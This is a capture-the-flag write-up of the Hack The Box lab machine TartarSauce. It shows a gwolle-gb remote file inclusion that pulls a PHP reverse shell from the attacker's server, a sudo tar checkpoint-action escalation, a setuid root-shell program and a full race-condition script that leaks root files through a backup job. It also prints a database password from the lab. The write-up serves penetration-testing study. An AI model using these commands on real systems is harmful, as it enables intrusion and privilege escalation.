## Default Information
IP Address: 10.10.10.88\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.88    tartar.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports. What is interesting from the output is that, there is only 1 open port, which is port 80. This means that we will have to focus more on the enumeration on our web services to find our attack surface.

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.88 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-12 09:43:23 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.88 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Apache httpd 2.4.18 ((Ubuntu)) | Open |


### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://tartar.htb

```
http://10.10.10.88:80/index.html           (Status: 200) [Size: 10766]
http://10.10.10.88:80/robots.txt           (Status: 200) [Size: 208]
http://10.10.10.88:80/robots.txt           (Status: 200) [Size: 208]
http://10.10.10.88:80/webservices          (Status: 301) [Size: 316] [--> http://10.10.10.88/webservices/]
```

However, what is interesting for http://tartar.htb is that there is an endpoints for robots.txt. Navigating to http://tartar.htb/robots.txt, we can find that there are some endpoints that are being disallowed which we will investigate furthur later.

```
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

From the output at the robots.txt endpoint, we realize that all of the disallowed endpoints are on /webservices endpoint. We will then use Gobuster to enumerate this endpoint to find other potential endpoints. From the output, we are only able to find an additional endpoint.

```
http://tartar.htb/webservices/wp                   (Status: 301) [Size: 317] [--> http://tartar.htb/webservices/wp/]
```

### Web-content discovery

From the robots.txt endpoint, we realize that we are able to access http://tartar.htb/webservices/monstra-3.0.4/ despite it being disallowed.

![Monstra CMS 3.0.4](https://github.com/joelczk/writeups/blob/main/HTB/Images/TartarSauce/monstra.png)

From the page itself, also find out that we are looking at Monstra CMS 3.0.4. Also, we realize that there is an authenticated RCE vulnerability that could possibly be exploited from [exploit-db](https://www.exploit-db.com/exploits/49949)

Looking at the exploit, we realize that this might not be able to work as the exploit requires uploading of files. However, in this case, we do not seem to be able to upload files. We will leave this for later and come back if we are unable to find any other methods of exploitation.

![File upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/TartarSauce/file_upload.png)

## Exploit

### Enumerating plugins and themes
Remembering that we found a http://tartar.htb/webservices/wp endpoint during our enumeration previously, we will run a WPScan to find the potential WP plugins that can be exploited.

Next, we will use WPScan to try to enumerate the possible plugins and themes that can be found from http://tartar.htb/webservices/wp/

```
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://tartar.htb/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-10-01T18:28:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://tartar.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-12-09T08:36:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:11 <=====================================> (400 / 400) 100.00% Time: 00:00:11
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://tartar.htb/webservices/wp/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://tartar.htb/webservices/wp/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.9'

[+] twentyseventeen
 | Location: http://tartar.htb/webservices/wp/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://tartar.htb/webservices/wp/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.4'

[+] twentysixteen
 | Location: http://tartar.htb/webservices/wp/wp-content/themes/twentysixteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://tartar.htb/webservices/wp/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://tartar.htb/webservices/wp/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tartar.htb/webservices/wp/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.4'
```

### Finding for vulnerable plugins and themes
Looking at the Akismet plugin, we realized that this plugin is mainly vulnerable to cross-site scripting, which is not very useful for us. Moving on, the gwolle-gb plugin is vulnerable to remote file inclusion attack but the vulnerable version is 1.5.3, but the detected version is 2.3.10. It seems like there are no vulnerabilites in the plugins that we can exploit. 

Let's move on to the themes. Unfortunately, we are not able to find much exploits with the themes, which leads us to a dead-end.

Moving back to the plugins, when we visit http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt, we noticed something out of ordinary. The author of this machine actually modified the version number to match 2.3.10 when the plugin version is 1.5.3. This means that we can do a remote file inclusion attack on the gwolle-gb plugin!

```
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```

### RFI in gwolle-gb plugin
Let's try to exploit RFI by visiting http://tartar.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6:4000/. We realize that a GET request is being made for wp-load.php file from our server. THis means that we can easily get a PHP reverse shell and rename it as wp-load.php to be able to spawn a reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 4000
Serving HTTP on 0.0.0.0 port 4000 (http://0.0.0.0:4000/) ...
10.10.10.88 - - [13/Dec/2021 12:07:47] code 404, message File not found
10.10.10.88 - - [13/Dec/2021 12:07:47] "GET /wp-load.php HTTP/1.0" 404 -
```

### RFI to RCE
By modifying our PHP reverse shell and renaming it to wp-load.php, we are able to obtain a reverse shell. Next, we will have to stabilize our reverse shells.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000                             
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.88] 46968
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 12:19:26 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@TartarSauce:/$ export TERM=xterm
export TERM=xterm
www-data@TartarSauce:/$ stty cols 132 rows 34
stty cols 132 rows 34
```

### Privilege Escalation to onuma

However, we realize that we are still unable to obtain the user flag as we do not have the permissions to view the user.txt file in /home/onuma

```
www-data@TartarSauce:/home$ ls
ls
onuma
www-data@TartarSauce:/home$ cat onuma/user.txt
cat onuma/user.txt
cat: onuma/user.txt: Permission denied
```

Executing ```sudo -l```, we realized that we are able to run /bin/tar command as the onuma user. This means that we can privilege escalate to onuma via /bin/tar commands.

From GTFO bins, we can easily privilege escalate as the onuma users using tar commands.

```
www-data@TartarSauce:/home$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
onuma@TartarSauce:/home$ id 
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

### Obtaining user flag
```
onuma@TartarSauce:/home$ cat onuma/user.txt
cat onuma/user.txt
<Redacted user flag>
```
### Finding backuperer being executed in the background

From our linpeas script, we realize that there is a system timer that is being executed in the background. However, this is not being listed in the active processes from the script.

```                                                                                                                               
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES                                                                                         
Mon 2021-12-13 13:15:01 EST  2min 22s left Mon 2021-12-13 13:10:01 EST  2min 37s ago backuperer.timer             backuperer.service
service
```

We are also able to discover the location of the backuperer file from the linpeas script. From here, we can see that the file is being executed with root privileges.

```
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
```

### Source code analysis of backuperer

Let us take note of the variables that are being defined and used throughout the script

```
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check
```

Firstly, the script will do a remove the tmp /var/tmp/.* files and the /var/tmp/check directory. Afterwards, it will take all the files in the /var/www/html directory and save it as a gzip archive. Finally, the script will sleep for 30s.

```
# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
/bin/sleep 30
```

Secondly, it creates a temporary directory /var/tmp/check and extracts the gzip archive created earlier into /var/tmp/check directory.

```
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
```

Lastly, the script runs the ```integrity_chk``` function. If the script fails the integrity check, the output will be saved to /var/backups/onuma_backup_error.txt. Otherwise, the temporart gzip archice will be moved to /var/backups/onuma-www-dev.bak. 
```
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

### Obtaining root flag
To obtain the root flag, we will make use of the sleep and the recursive diff from the code analysis of backuper script. During the sleep, we will first unpack the archive and replace the /var/www/html/robots.txt files with a symbolic link to /root/root.txt. Afterwards, we will then re-archive the files and place it back to the same directory. When the backuperer script runs, it will do a recursive diff of the /var/www/html directory in the archive against the /var/www/html. It will then find the difference between the root.txt file and the robots.txt file and output the difference to the /var/backups/onuma_backup_error.txt file. All we have to do is to read the /var/backups/onuma_backup_error.txt to find the root flag. 

In order to do this, we will use the script from [0xdf.gitlab.io](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html) to help us easily obtain the flag. 

```
onuma@TartarSauce:/tmp$ ./exploit.sh
./exploit.sh
Waiting for archive filename to change...
File changed... copying here
tar: var/www/html/webservices/monstra-3.0.4/public/uploads/.empty: Cannot stat: Permission denied
tar: Exiting with failure status due to previous errors
rm: cannot remove '.872efbf672debe4bce3f9eeb27afa02ce6245db4': No such file or directory
rm: cannot remove 'var/www/html/webservices/monstra-3.0.4/public/uploads/.empty': Permission denied
Waiting for new logs...
Only in /var/tmp/check/var/www/html: setuid
Only in /var/www/html: webservices
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Tue Dec 14 07:44:44 EST 2021
------------------------------------------------------------------------
/var/tmp/.3dff5229a58067f8c2208d9082f51f9d4b3fb873
Only in /var/www/html: index.html
Only in /var/www/html: robots.txt
Only in /var/tmp/check/var/www/html: setuid
Only in /var/www/html: webservices
tail: inotify resources exhausted
tail: inotify cannot be used, reverting to polling
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Tue Dec 14 07:49:48 EST 2021
------------------------------------------------------------------------
/var/tmp/.872efbf672debe4bce3f9eeb27afa02ce6245db4
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> <Redacted root flag>
Only in /var/www/html/webservices/monstra-3.0.4/public/uploads: .empty
```

## Post-Exploitation
### WP-config files
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 root root 2963 Jan 21  2021 /var/www/html/webservices/wp/wp-config.php                                                                                                                                 
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');

```

### backuperer

Another way of finding out how backuperer works is by using pspy. For this, We will have to check the architcture of the server. Since this is i686, we will need to use the 32bit version of pspy.

```
onuma@TartarSauce:/var/tmp$ uname -m
uname -m
onuma@TartarSauce:/var/tmp$ lscpu | grep -i byte
lscpu | grep -i byte
Byte Order:            Little Endian
onuma@TartarSauce:/var/tmp$ 
```

From pspy32s, we can actually see that the script will first save the /var/www/html directory into /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3. Afterwards, it will extract the /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3 to the /var/tmp/check directory. Since the script pass the integrity check, the /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3 will be saved to /var/backups/onuma-www-dev.bak.

```
2021/12/13 13:55:24 CMD: UID=0    PID=7441   | /bin/rm -rf /var/tmp/. /var/tmp/.. /var/tmp/check 
2021/12/13 13:55:24 CMD: UID=0    PID=7445   | /bin/sleep 30 
2021/12/13 13:55:24 CMD: UID=0    PID=7444   | /bin/bash /usr/sbin/backuperer 
2021/12/13 13:55:24 CMD: UID=1000 PID=7448   | /bin/tar -zcvf /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3 /var/www/html                                                                                                              
2021/12/13 13:55:24 CMD: UID=1000 PID=7449   | gzip 
2021/12/13 13:55:54 CMD: UID=0    PID=7455   | gzip -d 
2021/12/13 13:55:54 CMD: UID=0    PID=7454   | /bin/tar -zxvf /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3 -C /var/tmp/check                                                                                                          
2021/12/13 13:55:55 CMD: UID=0    PID=7457   | /bin/bash /usr/sbin/backuperer 
2021/12/13 13:55:55 CMD: UID=0    PID=7456   | /bin/bash /usr/sbin/backuperer 
2021/12/13 13:55:55 CMD: UID=0    PID=7458   | /bin/mv /var/tmp/.ad5b240b1de0816919343cb0c0cc9dd441b9d9d3 /var/backups/onuma-www-dev.bak                                                                                                    
2021/12/13 13:55:55 CMD: UID=0    PID=7459   | /bin/rm -rf /var/tmp/check . ..
```

### Privilege Escalation to root

There is supposedly another method to obtain the root flag by spawning a root shell. All we have to do is to first write a setuid program.

```
#include <unistd.h>
int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Afterwards, we will compile the setuid program and move it into the /var/www/html directory. Finally, we will tar this directory into our tar archive.

```
gcc -m32 -o setuid setuid.c
chmod u+s setuid
tar -zcvf exploit var
```

Finally, all we have to do is to transfer it to the machine and replace it with the name of the backup when it is created. After the check directory is created, all we have to do is to navigation to /check/var/www/html and execute the setuid binary to obtain a root shell.

Unfortunately, I am unable to make this exploit work and so, I used the other exploit to obtain the root flag.

### Exploit script used for privilege Escalation 

```
#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt
```
